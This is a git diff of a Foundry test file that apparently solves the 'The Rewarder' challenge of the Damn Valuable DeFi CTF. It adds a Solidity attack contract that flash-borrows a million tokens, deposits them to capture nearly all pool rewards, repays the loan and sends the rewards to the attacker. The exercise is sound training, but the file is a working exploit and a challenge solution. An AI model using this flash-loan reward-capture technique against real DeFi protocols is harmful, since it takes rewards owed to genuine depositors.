@@ -10,6 +10,40 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+contract RewardAttack {
+    FlashLoanerPool flashloanerpool;
+    TheRewarderPool therewarderpool;
+    DamnValuableToken dvt;
+    RewardToken rewardToken;
+    address owner;
+    uint256 constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
+    constructor(FlashLoanerPool _flashloanerpool, TheRewarderPool _therewarderpool, DamnValuableToken _dvt, RewardToken _rewardToken) {
+        flashloanerpool = _flashloanerpool;
+        therewarderpool = _therewarderpool;
+        dvt = _dvt;
+        rewardToken = _rewardToken;
+        owner = msg.sender;
+    }
+
+    function attack() external {
+        // Calls flashloan and borrows all the tokens
+        flashloanerpool.flashLoan(TOKENS_IN_LENDER_POOL);
+    }
+
+    function receiveFlashLoan(uint256 amount) external {
+        // approval
+        dvt.approve(address(therewarderpool), amount);
+        // calls deposit to distribute rewards.
+        therewarderpool.deposit(amount);
+        // withdraw tokens
+        therewarderpool.withdraw(amount);
+        // transfer tokens back to flashloaner
+        dvt.transfer(address(flashloanerpool), amount);
+        // transfer reward tokens to attacker
+        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
+    }
+}
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -87,9 +121,18 @@ contract TheRewarder is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    // forge test --match-contract TheRewarder
     function testExploit() public {
         /** EXPLOIT START **/
-
+        // timeskip 5 days in order to claim rewards.
+        vm.warp(block.timestamp + 5 days);
+        // So we need to flashloan an absurd amount of DVT tokens
+        // (1_000_000 tokens vs the 100 tokens the other users have)
+        // which will allow us to take nearly all of the rewards for ourselves.
+        vm.startPrank(attacker);
+        RewardAttack rewardAttack = new RewardAttack(flashLoanerPool, theRewarderPool, dvt, theRewarderPool.rewardToken());
+        rewardAttack.attack();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
